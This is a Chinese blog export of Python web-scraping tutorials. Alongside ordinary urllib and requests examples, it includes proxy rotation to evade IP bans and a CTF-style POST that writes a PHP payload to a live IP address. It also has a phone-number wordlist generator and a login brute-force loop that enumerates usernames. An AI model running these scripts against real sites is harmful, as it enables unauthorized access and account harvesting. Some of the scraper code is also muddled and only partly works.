假如一个网站它会检测某一段时间某个IP 的访问次数，如果访问次数过多，它会禁止你的访问。所以你可以设置一些代理服务器来帮助你做工作，每隔一段时间换一个代理。代码如： import urllib2 enable_proxy = True proxy_handler = urllib2.ProxyHandler({&quot;http&quot; : &apos;http://some- proxy.com:8080&apos;}) null_proxy_handler = urllib2.ProxyHandler({}) if enable_proxy: opener = urllib2.build_opener(proxy_handler) else: opener = urllib2.build_opener(null_proxy_handler) urllib2.install_opener(opener) timeout延迟 有些网站等待超时，为了解决一些网站实在响应过慢而造成的影响，用到timeout参数 import urllib2 response = urllib2.urlopen(&apos;http://www.baidu.com&apos;, timeout=10) python字符串str和字节数组相互转化方法# bytes object b = b&quot;example&quot; # str object s = &quot;example&quot; # str to bytes bytes(s, encoding = &quot;utf8&quot;) # bytes to str str(b, encoding = &quot;utf-8&quot;) # an alternative method # str to bytes str.encode(s) # bytes to str bytes.decode(b) 爬行糗事百科贴脚本： #coding:utf-8 import requests import base64 import re url=&apos;https://www.qiushibaike.com/&apos; s=requests.Session() r=s.get(url) b=r.text b=re.findall(r&apos;(&lt;div class=&quot;content&quot;&gt;([\s\S])&lt;span&gt;([\s\S]){3}.*([\s\S]){2}&lt;/span&gt;)+([\s\S])&apos;,b) #b =&apos;&apos;.join(b) #a=matchaaa.replace(&quot; &quot;,&quot; &quot;) f=open(&apos;1.txt&apos;) #b=matchaaa b=f.read() b=b.replace(&quot;&lt;span&gt;&quot;,&quot; &quot;) b=b.replace(&apos;&lt;div class=&quot;content&quot;&gt;&apos;,&quot; &quot;) b=b.replace(&quot;&lt;/span&gt;&quot;,&quot; &quot;) b=b.replace(&quot;&apos;\\n&apos;&quot;,&quot; &quot;) b=b.replace(&quot;\\n&quot;,&quot; &quot;) if b: print(b) #备注解析1.正则的search()函数，这个函数可以找到一个匹配的字符串返回，但是想找到所有匹配的字符串返回，需要使用findall，findall函数返回的总是正则表达式在字符串中所有匹配结果的列表，此处主要讨论列表中“结果”的展现方式，即findall中返回列表中每个元素包含的信息。因为返回形式为数组所以后面replace格式出了某些问题暂不明。2.b=r.text 或者 b=r.content.decode()都可 格式class str3.这里直接将抓取的b去replace报错，不明白为啥欢迎大牛指出，所以保存了一个文件中再读取，格式就正确。4.\n 正则那里需要转义一个\5.爬虫最好用beautiful soup，本文只是为了练习正则等python用法。结果如下: 爬取百度#coding:utf-8 import requests import base64 import re from bs4 import BeautifulSoup#爬虫常用模块 import lxml headers = { &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate, compress&apos;, &apos;Accept-Language&apos;: &apos;en-us;q=0.5,en;q=0.3&apos;, &apos;Cache-Control&apos;: &apos;max-age=0&apos;, &apos;Connection&apos;: &apos;keep-alive&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0&apos; } str=raw_input(&quot;请输入你要查找的关键字：&quot;)#输入查找的关键字 pn=raw_input(&quot;请输入你要爬取的页数：&quot;)#输入需要爬行几页 pnn=int(pn) for i in range(0,pnn): pn = int(i) * 10 pn = bytes(pn) url=&apos;https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;tn=monline_4_dg&amp;wd=&apos;+str+&apos;&amp;oq=fdsfs&amp;rsv_pq=a3b95bf10006369b&amp;rsv_t=f84emHqbAsRGwITxX0xpSE8jCnNkrSbFv%2FO0WK9oEnD2ya1fJl1gCKe5peQZFBklaWQB&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=13&amp;rsv_sug1=12&amp;rsv_sug7=100&amp;bs=fdsfs&amp;pn=&apos;+pn r=requests.get(url,headers=headers)#模拟客户端传递参数 b=r.content b=&quot;&quot;.join(b) #让列表形式的type转化为str字符串这样才可以用replace soup = BeautifulSoup(b,&quot;lxml&quot;) tagh3 = soup.find_all(&apos;h3&apos;) for h3 in tagh3: href = h3.find(&apos;a&apos;).get(&apos;href&apos;) baidu_url = requests.get(url=href, headers=headers, allow_redirects=False) real_url = baidu_url.headers[&apos;Location&apos;] # 得到网页原始地址 with open(&apos;result/&apos;+str+&apos;.txt&apos;, &apos;a+&apos;) as f: #将文件以附加的方式写入搜索名字.txt文件中 f.write(real_url+&quot;\n&quot;) print(real_url) 参考：文章]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python的web基础应用]]></title>
    <url>%2F2018%2F08%2F31%2Fpython%E7%9A%84web%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[#简单脚本分享 简单爬行页面 3.x与2.ximport urllib.request #3.x版本 url=&apos;http://www.baidu.com/&apos; def getHtml(url): page=urllib.request.urlopen(url) html=page.read().decode(encoding=&apos;utf-8&apos;,errors=&apos;strict&apos;) return html print(getHtml(url)) import requests #2.x版本 import string headers = { &apos;Connection&apos;: &apos;Keep-Alive&apos;, &apos;Accept&apos;: &apos;text/html, application/xhtml+xml, */*&apos;, &apos;Accept-Language&apos;: &apos;en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 LB&apos; } url=&quot;https://www.qq.com&quot; res=requests.get(url,headers) print(res.text) post传参，设置cookie，截取返回页面固定长度 2.xurl=&apos;http://106.75.72.168:2222/index.php&apos; headers = { &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate, compress&apos;, &apos;Accept-Language&apos;: &apos;en-us;q=0.5,en;q=0.3&apos;, &apos;Cache-Control&apos;: &apos;max-age=0&apos;, &apos;Connection&apos;: &apos;keep-alive&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0&apos;, &apos;cookie&apos;: &apos;Hm_lvt_9d483e9e48ba1faa0dfceaf6333de846=1542198011; role=Zjo1OiJucXp2YSI7&apos; } payload={&apos;filename&apos;:&apos;1.php&apos;,&apos;data[]&apos;:&apos;&lt;?php phpinfo();?&gt;&apos;} r=requests.post(url,headers=headers,data=payload) url=&quot;http://106.75.72.168:2222&quot;+r.content[82:128] r=requests.get(url) print r.content 字典制作 各版本with open(&apos;wordlist.txt&apos;,&apos;w+&apos;) as f: for i in range(0,10): for j in range(0,10): for k in range(0,10): for h in range(0,10): f.write(&apos;1391040&apos;+str(i)+str(j)+str(k)+str(h)+&apos;\n&apos;) f.close 保存本地到wordlist.txt文件里1391040xxxx生成后四位的字典。 python登陆网站 3.xfrom urllib import request#导入urllib模块里的request from urllib import parse#parse模块里的编码 from urllib.request import urlopen values ={&apos;zhanghao&apos;:&apos;admin&apos;,&apos;mima&apos;:&apos;admin&apos;} data=parse.urlencode(values).encode(&apos;utf-8&apos;)#提交类型不能为str，需要为byte类型,parse.urlencode方法的作用是把dict格式的参数转换为url参数，并以utf-8编码,可以拼接为HTTP请求。 url=&apos;http://127.0.0.1/login.php&apos; request=request.Request(url,data) response=urlopen(request) print(response.read().decode())#加入decode才能使网页解码成中文 整理 3.x版本import urllib.parse#urlencode import urllib.request#Request,urlopen &apos;&apos;&apos; response=urllib.request.urlopen(&quot;http://127.0.0.1&quot;) print(response.read().decode()) &apos;&apos;&apos; #设置header和data &apos;&apos;&apos; url=&apos;http://127.0.0.1/login.php&apos; user_agent=&apos;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&apos; values={&apos;zhanghao&apos;:&apos;admin&apos;,&apos;mima&apos;:&apos;admin&apos;} headers={&apos;User-Agent&apos;:user_agent} data=urllib.parse.urlencode(values).encode(&apos;utf-8&apos;) request=urllib.request.Request(url,data,headers) response=urllib.request.urlopen(request) page=response.read() print(page.decode()) &apos;&apos;&apos; #设置代理 避免因为某个IP的访问次数过多导致的禁止访问 &apos;&apos;&apos; enable_proxy = True proxy_handler = urllib.request.ProxyHandler({&quot;http&quot;:&apos;http://some-proxy.com:8080&apos;}) null_proxy_handler = urllib.request.ProxyHandler({}) if enable_proxy: opener = urllib.request.build_opener(proxy_handler) else: opener = urllib.request.build_opener(null_proxy_handler) urllib.request.install_opener(opener) &apos;&apos;&apos; #设置timeout # urlopen与Request 区别https://blog.csdn.net/tao3741/article/details/75207879 &apos;&apos;&apos; response=urllib.request.urlopen(&apos;http://127.0.0.1&apos;,timeout=10) print(response.read().decode()) &apos;&apos;&apos; #post put 等提交方式 &apos;&apos;&apos; request=urllib.request.Request(url,data,headers)#post 直接写在data里 request=urllib.request.Request(&apos;http://127.0.0.1?a=1&apos;)#get直接写在url里 request = urllib.request.Request(url, data=data)#put和delete request.get_method = lambda:&apos;PUT&apos; #or &apos;DELETE&apos;#put和delete &apos;&apos;&apos; #使用DebugLog 把收发包的内容在屏幕上打印出来 &apos;&apos;&apos; httpHandler = urllib.request.HTTPHandler(debuglevel=1) httpsHandler = urllib.request.HTTPSHandler(debuglevel=1) opener = urllib.request.build_opener(httpHandler, httpsHandler) urllib.request.install_opener(opener) response = urllib.request.urlopen(&apos;http://127.0.0.1&apos;, timeout = 5) &apos;&apos;&apos; #URLError异常属性判断 &apos;&apos;&apos; request=urllib.request.Request(&apos;http://127.0.0.999&apos;) try: urllib.request.urlopen(request) except urllib.error.URLError as e: if hasattr(e, &quot;code&quot;): #hasattr 判断变量是否有某个属性 print(e.code) if hasattr(e, &quot;reason&quot;): print(e.reason) else: print(&quot;OK&quot;) &apos;&apos;&apos; 设置cookie，header以及find来匹配网页中文字符。 #coding=utf-8 import requests import sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) url=&quot;http://127.0.0.1&quot; cookie={&apos;User-Center&apos;:&apos;aa&apos;,&apos;csrf_token&apos;:&apos;aa&apos;} headers = { &apos;Connection&apos;: &apos;Keep-Alive&apos;, &apos;Accept&apos;: &apos;text/html, application/xhtml+xml, */*&apos;, &apos;Accept-Language&apos;: &apos;en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 LB&apos; } passwd=&quot;admin1&quot; dic = open(&apos;./22.txt&apos;, &apos;r&apos;) for dic in dic.readlines(): dic = dic.strip(&apos;\n&apos;) p=passwd+dic #print p data={&apos;csrf_token&apos;:&apos;aa&apos;,&apos;username&apos;:p,&apos;password&apos;:&apos;test&apos;,&apos;captcha&apos;:&apos;dsa&apos;} res=requests.post(url=url,data=data,cookies=cookie,headers=headers) #print res.text #zhengze= u&apos;\u9519\u8bef\u6b21\u6570&apos; #pat = re.compile(zhengze) if res.text.find(&apos;用户不存在&apos;) != -1: print &apos;false&apos; else: with open(&apos;./success.txt&apos;,&apos;a&apos;) as f1: f1.write(p + &quot;\n&quot;) 参考：文章]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
</search>
